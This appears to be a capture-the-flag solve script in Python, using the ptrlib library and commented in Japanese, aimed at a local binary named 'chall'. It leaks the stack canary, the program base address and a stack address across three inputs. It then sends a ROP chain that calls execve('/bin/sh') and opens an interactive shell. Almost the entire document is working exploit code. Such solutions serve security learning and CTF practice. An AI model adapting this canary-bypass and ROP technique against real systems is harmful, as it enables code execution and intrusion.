from ptrlib import *

elf = ELF("./chall")
proc = Process("./chall")


def leak_canary():
    payload = b"A" * 0x18
    payload += b"A"  # canary の先頭の終端文字を上書き
    proc.sendafter("Input (1/4) >> ", payload)
    proc.recvuntil(payload)
    return u64(b"\0" + proc.recv(7))


def leak_base_address():
    payload = b"A" * 0x18  # local variable
    payload += b"B" * 0x8  # canary
    payload += b"C" * 0x8  # saved rbp
    proc.sendafter("Input (2/4) >> ", payload)
    proc.recvuntil(payload)

    offset = elf.symbol("__libc_start_call_main")
    addr_libc_start_call_main = (
        u64(proc.recv(6)) - 0x68
    )  # main の return address は __libc_start_call_main + 0x68
    addr_base = addr_libc_start_call_main - offset
    assert addr_base & 0xFFF == 0  # ページアライメントされているはず
    return addr_base


def leak_msg_address():
    payload = b"A" * 0x18  # local variable
    payload += b"B" * 0x8  # canary
    payload += b"C" * 0x8  # saved rbp
    payload += b"D" * 0x8  # return address
    payload += b"E" * 0x8
    proc.sendafter("Input (3/4) >> ", payload)
    proc.recvuntil(payload)
    # main 関数の stack frame の下を見ると
    # msg+0x38 の位置にローカル変数のポインタらしきものがある
    # それは msg+0x138 を指している
    return u64(proc.recv(6)) - 0x138


def make_rop_chain(canary, addr_base, addr_msg):
    elf.base = addr_base

    # rdx は元々 0 なので pop rdx は不要

    # pop rsi; ret はそのままはない
    # rp++ で以下が見つかる(他にもあるけどなんか SIGSEGV になった)
    # `rp++ --file ./chall --rop 5 --unique | grep "pop rsi"`
    # 0x9a0d: pop rdi ; pop rbp ; ret ; (230 found)
    set_rdi = addr_base + 0x9A0D
    set_rsi = next(elf.gadget("pop rsi; ret"))
    set_rax = next(elf.gadget("pop rax; ret"))
    syscall = next(elf.gadget("syscall"))

    print(f"set_rdi: {hex(set_rdi)}")
    print(f"set_rsi: {hex(set_rsi)}")
    print(f"set_rax: {hex(set_rax)}")
    print(f"syscall: {hex(syscall)}")

    payload = b"/bin/sh\0"
    payload += b"A" * (0x18 - len(payload))
    payload += p64(canary)  # canary
    payload += b"\0" * 0x8  # saved rbp
    payload += p64(set_rdi)
    payload += p64(addr_msg)  # pathname
    payload += p64(0)
    payload += p64(set_rsi)
    payload += p64(0)  # argv
    payload += p64(set_rax)
    payload += p64(59)  # execve number
    payload += p64(syscall)

    print(hex(len(payload)))
    assert len(payload) <= 0x70  # 入力文字数の制限

    proc.send(payload)
    return


def main():
    # 1回目: canary leak
    canary = leak_canary()
    assert canary & 0xFF == 0
    print(f"canary: {hex(canary)}")

    # 2回目: __libc_start_call_main から base address を leak
    addr_base = leak_base_address()
    assert addr_base & 0xFFF == 0  # ページアライメントされているはず
    print(f"addr_base: {hex(addr_base)}")

    # 3回目: stack address leak
    addr_msg = leak_msg_address()
    print(f"addr_msg: {hex(addr_msg)}")

    # 4回目: rop 配置
    make_rop_chain(canary, addr_base, addr_msg)

    # 祈る
    proc.interactive()
    return


if __name__ == "__main__":
    main()
